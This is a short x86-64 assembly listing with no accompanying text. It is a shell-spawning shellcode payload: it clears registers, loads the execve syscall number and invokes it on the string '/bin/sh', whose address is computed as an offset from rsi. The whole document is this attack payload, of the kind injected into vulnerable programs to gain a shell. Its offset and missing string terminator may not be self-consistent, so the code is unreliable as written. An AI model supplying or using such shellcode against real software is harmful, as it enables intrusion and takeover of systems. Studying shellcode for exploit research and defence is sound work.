section .text
  global _start
    _start:
      lea  rdi, [rsi+0x2d]        ; 1st argument
      xor rsi, rsi
      xor rdx, rdx
      xor rax, rax
      mov  al, 0x3b        ; execve()
      syscall
      db   '/bin/sh'

